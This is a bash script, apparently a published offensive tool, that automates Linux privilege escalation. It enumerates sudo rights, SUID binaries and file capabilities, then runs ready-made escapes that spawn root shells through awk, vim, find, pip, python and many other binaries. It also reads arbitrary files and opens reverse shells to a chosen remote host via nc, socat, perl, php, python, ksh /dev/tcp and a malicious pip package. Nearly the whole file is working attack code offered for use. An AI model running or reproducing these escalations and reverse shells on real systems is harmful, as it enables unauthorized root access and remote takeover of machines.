#!/bin/bash

# Coded by: Jsmoreira02
# https://github.com/Jsmoreira02

SUPPORTED_FILE_READ_BINARIES=("gdb" "look" "ruby" "python" "python3" "perl" "cp" "vim" "cat" "awk" "openvpn" "gcc" "base32" "base58" "sed" "base64" "arp" "bash" "curl" "more" "neofetch" "git" "dig")
SUPPORTED_SUDO_BINARIES=("awk" "ash" "chroot" "python3" "apt" "bash" "at" "lua" "choom" "sudo" "php" "pip" "pip3" "tmux" "node" "pexec" "pkexec" "csh" "socat" "dash" "ruby" "python" "ed" "env" "ssh" "expect" "vi" "vim" "mount" "make" "git" "find" "ftp" "perl" "script" "gcc" "cp")
SUPPORTED_SUID_BINARIES=("ash" "gdb" "bash" "php" "chroot" "node" "pexec" "csh" "dash" "python" "python3" "env" "choom" "expect" "vim" "rvim" "vimdiff" "make" "find")
SUPPORTED_CAP_BINARIES=("gdb" "node" "php" "python" "python3" "ruby" "view" "vim" "rvim" "vimdiff")
SUPPORTED_REV_SHELL_BINARIES=("gdb" "python" "python3" "nc" "bash" "busybox" "perl" "php" "pip" "pip3" "socat" "ksh" "telnet")

CAPABILITIES=("cap_dac_read_search" "cap_dac_override" "cap_chown" "cap_setuid")
CAP_DESCRIPTION=( 
    "File reads! Available!"
    "Privileged ownership change of any file."
    "Privileged permission change of any file."
    "CAP_SETUID! Privileged Binary execution! Available!"
)

function banner_logo() {
    echo -e "
\033[0;33m ██████╗ █████╗ ████████╗    ██████╗ ██╗███╗   ██╗ █████╗ ██████╗ ██╗███████╗███████╗\033[0m    \033[0;31m/\_/\ \033[0m                        
\033[0;33m██╔════╝██╔══██╗╚══██╔══╝    ██╔══██╗██║████╗  ██║██╔══██╗██╔══██╗██║██╔════╝██╔════╝\033[0m   \033[0;31m( o.o ) \033[0m                    
\033[0;33m██║     ███████║   ██║       ██████╔╝██║██╔██╗ ██║███████║██████╔╝██║█████╗  ███████╗\033[0m    \033[0;31m> ^ <   _ \033[0m                
\033[0;33m██║     ██╔══██║   ██║       ██╔══██╗██║██║╚██╗██║██╔══██║██╔══██╗██║██╔══╝  ╚════██║\033[0m    \033[0;31m(   )  // \033[0m                 
\033[0;33m╚██████╗██║  ██║   ██║       ██████╔╝██║██║ ╚████║██║  ██║██║  ██║██║███████╗███████║\033[0m    \033[0;31m(| |)_// \033[0m                    
\033[0;33m ╚═════╝╚═╝  ╚═╝   ╚═╝       ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝\033[0m                          
"
}

function usage() {
    echo "Usage: ./$(basename "$0") [--bin <binary>] [--mode <operation mode>]"
    echo -e '\n\033[37;1mExample:\033[0m ./script -b "sudo python" -m rev_shell -h attacker.ip -p 443'
    echo -e '         ./script -b "/home/test/gdb" -m capabilities'
    
    echo -e "\n ---------------------------------- [\033[37;1mMAIN ARGUMENTS\033[0m] ----------------------------------\n"
    echo -e "  -b/--bin <binary>                 Specify the path to the binary file for operation mode."
    echo -e "                                    You can customize the command and add prefixes like “sudo”\n"
    echo -e "  -fr/--file_to_read                Specify the path of the file to read"
    echo -e "  -m/--mode <Operating Mode>        Specify operation mode\n"
    echo -e " ---------------------------------- [\033[37;1mMAIN ARGUMENTS\033[0m] ----------------------------------\n"

    echo -e " ---------------------------------- [\033[37;1mOPERATION ARGUMENTS\033[0m] ---------------------------------- \n"
    echo -e "  -cSudo/--check_sudo               [\033[31;1;3msudo\033[0m] Check for executables allowed in sudo"
    echo -e "  -cC/--check_capabilities          [\033[31;1;3mcapabilities\033[0m] Find all the binaries with capabilities"
    echo -e "  -cSuid/--check_suid               [\033[31;1;3msuid\033[0m] Locate all binaries set with SUID (Set User Identification) permissions"
    echo -e "  -p/--rport                        [\033[31;1;3mReverse shell\033[0m] Remote Port to reverse shell mode"
    echo -e "  -h/--rhost                        [\033[31;1;3mReverse shell\033[0m] Remote Host to reverse shell mode\n"  
    echo -e " ---------------------------------- [\033[37;1mOPERATION ARGUMENTS\033[0m] ---------------------------------- \n" 

    echo -e "  -h/--help                         Show Help Message"
    echo -e " Operation Modes => [\033[31;1msudo, \033[31;1mcapabilities\033[0m, \033[31;1msuid\033[0m, \033[31;1mrev_shell\033[0m, \033[31;1mfile_read\033[0m]\n"
    
    exit 1
}

function modes() {
    local binary="$1" mode="$2" file_to_read="$3" rhost="$4" rport="$5"

    if [[ $mode == "sudobin" || $mode == "sudo" ]]; then
        if [[ "$binary" =~ ^sudo[[:space:]] ]]; then
            printf "adding “sudo” is not necessary in this operation!\n"
            binary="${binary#sudo }"
        fi

        case $binary in
            awk) sudo $binary 'BEGIN {system("/bin/sh")}' ;;
            ash) sudo $binary ;;
            bash) sudo $binary;;
            pkexec) sudo $binary /bin/sh ;;
            csh) sudo $binary ;;
            chroot) sudo $binary / ;;
            socat) sudo $binary stdin exec:/bin/sh ;;
            dash) sudo $binary;;
            ed) printf "[\033[0;31m*\033[0m] Execute:\n\033[0;36msudo ed\033[0m\n\033[0;36m!/bin/sh\033[0m\n" ;;
            env) sudo $binary /bin/sh ;;
            expect) sudo $binary -c 'spawn /bin/sh;interact' ;;
            choom) sudo $binary -n 0 /bin/sh ;;
            vi) sudo $binary -c ':!/bin/sh' /dev/null ;;
            vim) sudo $binary-c ':!/bin/sh' ;;
            lua) sudo $binary -e 'os.execute("/bin/sh")' ;;
            ssh) sudo $binary -o ProxyCommand=';sh 0<&2 1>&2' x ;;
            apt) sudo $binary update -o APT::Update::Pre-Invoke::=/bin/sh ;;
            git)
                local tf
                tf=$(mktemp -d)
                ln -s /bin/sh "$tf/git-x"
                sudo $binary "--exec-path=$tf" x
                ;;
            find) sudo $binary . -exec /bin/sh \; -quit ;;
            ftp) printf "[\033[0;31m*\033[0m] Execute:\n\033[0;36msudo ftp\033[0m\n\033[0;36m!/bin/sh\033[0m\n" ;;
            perl) sudo $binary -e 'exec "/bin/sh";' ;;
            script) sudo $binary -q /dev/null ;;
            gcc) sudo $binary -wrapper /bin/sh,-s . ;;
            cp)
                sudo $binary /bin/sh /bin/cp
                sudo $binary
                ;;
            at) echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo $binary now; tail -f /dev/null ;;
            mount) 
                sudo $binary -o bind /bin/sh /bin/mount
                sudo $binary ;;
            make)
                COMMAND='/bin/sh'
                sudo $binary -s --eval=$'x:\n\t-'"$COMMAND" ;;
            node) sudo $binary -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})' ;;
            pexec) sudo $binary /bin/sh ;;
            ruby) sudo $binary -e 'exec "/bin/sh"' ;;
            python|python3) sudo $binary -c 'import os; os.system("/bin/sh")' ;;
            sudo) sudo $binary /bin/sh ;;
            tmux) sudo $binary ;;
            pip|pip3) 
                TF=$(mktemp -d)
                echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
                sudo $binary install $TF ;;
            php) 
                CMD="/bin/sh"
                sudo $binary -r "system('$CMD');" ;;
            *) return 1 ;;
        esac

    elif [[ $mode == "bincap" || $mode == "cap" || $mode == "capabilities" ]]; then
        case $(basename "${binary#sudo }") in
            gdb) $binary -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit ;;
            node) $binary -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})' ;;
            python) $binary -c 'import os; os.setuid(0); os.system("/bin/sh")' ;;
            php)
                CMD="/bin/sh"
                $binary -r "posix_setuid(0); system('$CMD');" ;;
            ruby) $binary -e 'Process::Sys.setuid(0); exec "/bin/sh"' ;;
            rview) $binary -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' ;;
            rvim) $binary -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' ;;
            view) $binary -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' ;;
            vim) $binary -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' ;;
            vimdiff) $binary -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' ;;
            *) return 1 ;;
        esac

    elif [[ $mode == "fileread" || $mode == "read" || $mode == "file_read" ]]; then
        if [[ -z $file_to_read ]]; then
            echo -e "\033[0;31m[X]\033[0m Specify a file to read!\n"
            return 1
        else
            case $(basename "${binary#sudo }") in
                gdb) $binary -nx -ex "python print(open('$file_to_read').read())" -ex quit ;;
                ruby) $binary -e "puts File.read('$file_to_read')" ;;
                python|python3) $binary -c "print(open('$file_to_read').read())" ;;
                perl) $binary -ne "print" "$file_to_read" ;;
                vim) $binary "$file_to_read" ;;
                base32) $binary "$file_to_read" | $binary --decode ;;
                awk) $binary '//' "$file_to_read" ;;
                base58) $binary "$file_to_read" | $binary --decode ;;
                base64) $binary "$file_to_read" | $binary --decode ;;
                arp) $binary -v -f "$file_to_read" ;;
                bash)
                    HISTTIMEFORMAT=$'\r\e[K'
                    history -r "$file_to_read"
                    history ;;
                cat) $binary "$file_to_read" ;;
                look) $binary '' "$file_to_read" ;;
                curl) $binary "file://$file_to_read" ;;
                dig) $binary -f "$file_to_read" ;;
                gcc) $binary -xc /dev/null -o "$file_to_read" ;;
                git) $binary diff /dev/null "$file_to_read" ;;
                more) $binary "$file_to_read" ;;
                neofetch) $binary --ascii "$file_to_read" ;;
                openvpn) $binary --config "$file_to_read" ;;
                sed) $binary '' "$file_to_read" ;;
                cp) $binary "$file_to_read" /dev/stdout ;;
                *) return 1 ;;
            esac
        fi

    elif [[ $mode == "rev_shell" || $mode == "reverse_shell" || $mode == "shell" || $mode == "revshell" ]]; then
        case $(basename "${binary#sudo }") in
            busybox) $binary nc -e /bin/sh "$rhost" "$rport" ;;
            nc) $binary -e /bin/sh "$rhost" "$rport" ;;
            perl) 
                export RHOST="$rhost"
                export RPORT="$rport"
                $binary -e 'use Socket;use IO::Socket::INET;$i=$ENV{"RHOST"};$p=$ENV{"RPORT"};$socket=new IO::Socket::INET(PeerAddr=>$i,PeerPort=>$p,Proto=>"tcp") or die "Erro ao conectar: $!\n";open(STDIN, ">&$socket");open(STDOUT, ">&$socket");open(STDERR, ">&$socket");exec("/bin/sh -i") or die "Erro ao executar shell: $!\n";' ;;
            php)
                export RHOST="$rhost"
                export RPORT="$rport"
                $binary -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");' ;;
            pip|pip3)
                export RHOST="${rhost}"
                export RPORT="${rport//[[:space:]]/}"
                TF=$(mktemp -d)
                echo 'from setuptools import setup; setup(name="rshell", version="1.0", py_modules=["rshell"], entry_points={"console_scripts": ["rshell=rshell:main"]})' > "$TF/setup.py"; printf 'import socket, os, pty\n\ndef main():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(("%s", %s))\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(), 2)\n    pty.spawn("/bin/bash")\n\nif __name__ == "__main__":\n    main()\n' "$RHOST" "$RPORT" > "$TF/rshell.py";
                $binary install $TF
                export PATH="$PATH:$HOME/.local/bin"

                if [[ $binary == *"sudo"* ]]; then
                    sudo rshell 
                else
                    rshell
                fi ;;
            socat)
                export RHOST="$rhost"
                export RPORT="$rport"
                $binary tcp-connect:$rhost:$rport exec:/bin/sh,pty,stderr,setsid,sigint,sane ;;
            telnet)
                RHOST="$rhost"
                RPORT="$rport"
                TF=$(mktemp -u)
                mkfifo $TF && $binary $RHOST $RPORT 0<$TF | /bin/sh 1>$TF ;;
            python|python3) 
                export RHOST="$rhost"
                export RPORT=$(echo "$rport" | tr -d '[:space:]')
                $binary -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")';;
            ksh)
                export RHOST="$rhost"
                export RPORT="$rport"
                $binary -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1' ;;
            gdb)
                export RHOST="$rhost"
                export RPORT="$rport"
                $binary -nx -ex 'python import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' -ex quit ;;
            *) return 1 ;;
        esac

    elif [[ $mode == "suidbin" || $mode == "suid" || $mode == "SUID" ]]; then
        case $(basename "${binary#sudo }") in
            ash) $binary ;;
            bash) $binary -p ;;
            php) $binary -r "pcntl_exec('/bin/sh', ['-p']);" ;;
            chroot) $binary / /bin/sh -p ;;
            node) $binary -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})' ;;
            pexec) $binary /bin/sh -p ;;
            csh) $binary -b ;;
            dash) $binary -p ;;
            python) $binary -c 'import os; os.execl("/bin/sh", "sh", "-p")' ;;
            env) $binary /bin/sh -p ;;
            expect) $binary -c 'spawn /bin/sh -p;interact' ;;
            vim) $binary -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")' ;;
            rvim) $binary -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")' ;;
            vimdiff) $binary -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")' ;;
            make) 
                COMMAND='/bin/sh -p'
                $binary -s --eval=$'x:\n\t-'"$COMMAND" ;;
            find) $binary . -exec /bin/sh -p \; -quit ;;
            choom) $binary -n 0 -- /bin/sh -p ;;
            gdb) $binary -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit ;;
            *) return 1 ;;
        esac
    fi

}

function check_sudo() {
    local sudo_perms list_users
    sudo_perms=$(sudo -v 2>&1)
    list_users=$(awk -F: '$6 ~ /\/home/ {print $1}' /etc/passwd)

    if [[ $sudo_perms =~ "Sorry, user may not run sudo" ]]; then
        printf "[\033[0;31mX\033[0m] User does not have access to sudo privileges on the system\n"
        printf "[\033[0;32m->\033[0m] Try these other ones:\n%s\n" "$list_users"
        return 1
    else
        printf "[\033[0;32mOK!\033[0m] User has got sudo rights!\n"
    fi
}

function list_sudo_binaries() {
    local sudo_output executables executable_list
    check_sudo || return 1

    sudo_output=$(sudo -l 2>/dev/null)
    if [[ -z "$sudo_output" ]]; then
        printf "[\033[0;31mX\033[0m] Failed to retrieve sudo list.\n" >&2
        return 1
    fi

    executables=$(printf "%s\n" "$sudo_output" | grep -oP '(/[\w/]+)' | awk -F'/' '{print $NF}' | sort -u)
    mapfile -t executable_list < <(printf "%s\n" "$executables")

    printf "[\033[0;32m>>>\033[0m] Executables allowed by sudo:\n"
    for executable in "${executable_list[@]}"; do
        echo -e "\033[0;36m$executable\033[0m"
    done
}

function list_capabilities() {
    echo -e "\033[0;33m[+]\033[0m Available Capabilities!...\n"
    getcap -r / 2>/dev/null
    echo -e "\n\033[0;33m-------------------------------------------\033[0m\n"

    local file
    
    while IFS= read -r -d '' file; do
        local caps
        caps=$(getcap "$file" 2>/dev/null)
        if [[ -n $caps ]]; then
            for i in "${!CAPABILITIES[@]}"; do
                if [[ $caps == *"${CAPABILITIES[$i]}"* ]]; then
                    echo -e "\033[1;37m$(basename "$file")\033[0m" "\033[1;36m${CAP_DESCRIPTION[$i]}\033[0m"
                fi
            done
        fi
    done < <(find / -type f -perm /u=x,g=x,o=x -print0 2>/dev/null)

    echo ""
}

function list_suid_binaries() {
    echo -e "\033[0;33m[+]\033[0m Finding Existing SUID Binaries!...\n"
    echo -e "\033[0;33m-------------------------------------------\033[0m\n"
    find / -perm -u=s -type f 2>/dev/null; find / -perm -4000 -o- -perm -2000 -o- -perm -6000
    echo -e "\n\033[0;33m-------------------------------------------\033[0m\n"

    local suid_binaries=()
    while IFS= read -r binary; do
        suid_binaries+=("$binary")
    done < <(find / -perm -u=s -type f -exec basename {} \; 2>/dev/null)

    local found_supported_binaries=()
    for binary in "${suid_binaries[@]}"; do
        for supported_binary in "${SUPPORTED_SUID_BINARIES[@]}"; do
            if [[ $binary == "$supported_binary" ]]; then
                found_supported_binaries+=("$binary")
            fi
        done
    done

    if [[ ${#found_supported_binaries[@]} -gt 0 ]]; then
        echo -e "\033[1;36m[>]\033[0m Try These:  "
        printf "%s\n" "${found_supported_binaries[@]}"
        echo ""
    else
        echo -e "\033[0;31m[-]\033[0m No supported SUID binaries found.\n"
    fi
}

function privilege_escalations() {
    local binary="$1" operation_mode="$2" file_to_read="$3" rhost="$4" rport="$5" validate=0
    local normalized_binary; normalized_binary=$(basename "${binary#sudo }")

    if [[ -z $operation_mode ]]; then
        echo -e "\033[0;31m[X]\033[0m Please select an operating mode => {sudo, SUID, capabilities, file_read, rev_shell}\n" >&2
        return 1
    fi

    if [[ $operation_mode == "sudobin" || $operation_mode == "sudo" || $operation_mode == "SUDO" ]]; then
        for supported_binary in "${SUPPORTED_SUDO_BINARIES[@]}"; do
            if [[ $supported_binary == "$normalized_binary" ]]; then
                printf "\033[0;32m[!]\033[0m %s escalation mode selected!\n" "$binary"
                validate=1
                break
            fi
        done
    fi

    if [[ $operation_mode == "bincap" || $operation_mode == "cap" || $operation_mode == "capabilities" ]]; then
        for supported_binary in "${SUPPORTED_CAP_BINARIES[@]}"; do
            if [[ $supported_binary == "$normalized_binary" ]]; then
                printf "\033[0;32m[!]\033[0m %s escalation mode selected!\n" "$binary"
                validate=1
                break
            fi
        done
    fi

    if [[ $operation_mode == "fileread" || $operation_mode == "read" || $operation_mode == "file_read" ]]; then
        for supported_binary in "${SUPPORTED_FILE_READ_BINARIES[@]}"; do
            if [[ $supported_binary == "$normalized_binary" ]]; then
                printf "\033[0;32m[!]\033[0m %s escalation mode selected!\n" "$binary"
                validate=1
                break
            fi
        done
    fi

    if [[ $operation_mode == "suidbin" || $operation_mode == "suid" || $operation_mode == "SUID" ]]; then
        for supported_binary in "${SUPPORTED_SUID_BINARIES[@]}"; do
            if [[ $supported_binary == "$normalized_binary" ]]; then
                printf "\033[0;32m[!]\033[0m %s escalation mode selected!\n" "$binary"
                validate=1
                break
            fi
        done
    fi

    if [[ $operation_mode == "rev_shell" || $operation_mode == "reverse_shell" || $operation_mode == "shell" || $operation_mode == "revshell" ]]; then
        for supported_binary in "${SUPPORTED_REV_SHELL_BINARIES[@]}"; do
            if [[ $supported_binary == "$normalized_binary" ]]; then
                printf "\033[0;32m[!]\033[0m %s escalation mode selected!\n" "$binary"
                validate=1
                break
            fi
        done
    fi

    if [[ $validate -ne 1 ]]; then
        printf "\033[0;31m[X]\033[0m %s not supported in this script :( \nmaybe later\n" "$binary" >&2
        return 1
    else
        printf "\033[0;32m[+]\033[0m Exploiting %s...\n" "$binary"
        modes "$binary" "$operation_mode" "$file_to_read" "$rhost" "$rport"
    fi
}

function parse_args() {
    local bin_mode="" mode="" file_to_read="" rhost="" rport="" suid_binaries=0 sudo_binaries=0 binary_capabilities=0 help=0

    if [[ $# -eq 1 && $1 == "-h" ]]; then
        help=1
        shift
    fi

    while [[ $# -gt 0 ]]; do
        case $1 in
            --bin|-b)
                if [[ -z $2 ]]; then
                    printf "Error: --bin requires an argument\n" >&2
                    break
                fi
                bin_mode=$2
                shift 2
                ;;
            -m|--mode)
                if [[ -z $2 ]]; then
                    printf "Error: -m/--mode requires an argument\n" >&2
                    break
                fi
                mode=$2
                shift 2
                ;;
            --file_to_read|-fr)
                if [[ -z $2 ]]; then
                    printf "Error: --file_to_read requires an argument\n" >&2
                    break
                fi
                file_to_read=$2
                shift 2
                ;;
             -h|--rhost)
                if [[ -z $2 ]]; then
                    printf "Error: --rhost requires an argument\n" >&2
                    break
                fi
                rhost=$2
                shift 2
                ;;
            -p|--rport)
                if [[ -z $2 ]]; then
                    printf "Error: --rport requires an argument\n" >&2
                    break
                fi
                rport=$2
                shift 2
                ;;
            -cSuid|--check_suid)
                suid_binaries=1
                shift
                ;;
            -cSudo|--check_sudo)
                sudo_binaries=1
                shift
                ;;
            -cC|--check_capabilities)
                binary_capabilities=1
                shift
                ;;
            --help)
                help=1
                shift
                ;;
            -*|--*)
                printf "Error: Unknown option %s\n\n" "$1" >&2
                usage
                ;;
            *)
                break
                ;;
        esac
    done

    if [[ -n $bin_mode ]]; then
        privilege_escalations "$bin_mode" "$mode" "$file_to_read" "$rhost" "$rport"
    fi

    if [[ $sudo_binaries -eq 1 ]]; then
        list_sudo_binaries
    fi

    if [[ $binary_capabilities -eq 1 ]]; then
        list_capabilities
    fi

    if [[ $suid_binaries -eq 1 ]]; then
        list_suid_binaries
    fi

    if [[ $help -eq 1 ]]; then
        usage
    fi
}

main() {
    if [[ $# -eq 0 ]]; then
        usage
    fi

    parse_args "$@"
}

banner_logo
main "$@"
